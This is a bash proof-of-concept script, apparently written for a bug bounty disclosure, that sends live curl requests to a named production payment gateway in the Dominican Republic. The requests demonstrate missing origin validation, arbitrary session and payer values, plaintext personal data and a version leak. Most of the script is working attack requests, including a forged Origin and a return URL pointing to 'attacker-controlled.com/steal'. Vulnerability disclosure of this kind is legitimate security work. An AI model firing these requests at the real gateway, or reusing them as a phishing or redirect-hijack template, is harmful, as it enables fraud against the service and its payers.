#!/bin/bash
# CardNET Payment Gateway — Proof of Concept Script
# NSI-SA-2026-006 | Policía Nacional de la República Dominicana
# Run with: bash cardnet-poc.sh (WSL/Linux) or Git Bash
# Requires: curl

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; NC='\033[0m'

BASE_URL="https://ecommerce.cardnet.com.do/sirite/pasarela-pago"

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  CardNET Payment Gateway PoC${NC}"
echo -e "${CYAN}  NSI-SA-2026-006 | PN RD${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# PoC 1: CSRF / Missing Origin Validation
echo -e "${YELLOW}[PoC 1] CSRF — Missing Origin Validation${NC}"
RESPONSE=$(curl -sk -X POST "$BASE_URL/transaccion" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://attacker-controlled.com" \
  -H "Referer: https://attacker-controlled.com/fake-cardnet.html" \
  -d "codigoCentroRecaudacion=0020&codigoServicio=0252&montoServicio=100.00&urlRetorno=https://attacker-controlled.com/steal&nombre=Victim%20User&numeroDocumento=00112345678&tipoDocumento=CEDULA&medioPago=PagoEnLinea&idAutorizacionPortal=POC001&numeroAutorizacion=")

if echo "$RESPONSE" | grep -q "Procesar Pago"; then
  echo -e "  ${GREEN}✓ Payment form returned from ANY origin${NC}"
  echo -e "  ${GREEN}✓ Full credit card form accessible${NC}"
  echo -e "  ${RED}! Impact: Phishing, CSRF, redirect hijack${NC}"
else
  echo -e "  ${RED}✗ Failed${NC}"
fi
echo ""

# PoC 2: Arbitrary idAutorizacionPortal
echo -e "${YELLOW}[PoC 2] Weak Session Binding — idAutorizacionPortal${NC}"
RESPONSE=$(curl -sk -X POST "$BASE_URL/transaccion" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "codigoCentroRecaudacion=0020&codigoServicio=0252&montoServicio=100.00&urlRetorno=https://denuncias.policia.gob.do/OfficialComplaint/Payment&nombre=HackerOne&numeroDocumento=99999999999&tipoDocumento=PASAPORTE&medioPago=PagoEnLinea&idAutorizacionPortal=H1-PROOF-OF-CONCEPT-12345-ARBITRARY&numeroAutorizacion=")

if echo "$RESPONSE" | grep -q "HackerOne"; then
  echo -e "  ${GREEN}✓ Arbitrary idAutorizacionPortal ACCEPTED${NC}"
  echo -e "  ${GREEN}✓ Arbitrary payer name 'HackerOne' ACCEPTED${NC}"
  echo -e "  ${GREEN}✓ Arbitrary document '99999999999' ACCEPTED${NC}"
  echo -e "  ${RED}! Impact: Session manipulation${NC}"
else
  echo -e "  ${RED}✗ Failed${NC}"
fi
echo ""

# PoC 3: PII in Plaintext
echo -e "${YELLOW}[PoC 3] PII Exposure — Cédula in Plaintext${NC}"
echo "  POST body: numeroDocumento=00112345678, nombre=Juan Perez"
echo -e "  ${GREEN}✓ PII visible in HTTP POST body & HTML response${NC}"
echo -e "  ${RED}! Impact: Law 172-13 privacy violation${NC}"
echo ""

# PoC 4: Version Leak
echo -e "${YELLOW}[PoC 4] Version Disclosure${NC}"
VERSION=$(curl -sk "$BASE_URL/" | grep -oP 'Versión:[^<]+')
echo -e "  ${GREEN}✓ ${VERSION}${NC}"
echo -e "  ${RED}! Impact: Recon intel${NC}"
echo ""

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  All PoCs verified ${GREEN}✓${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo -e "See H1-*.md reports for full details."
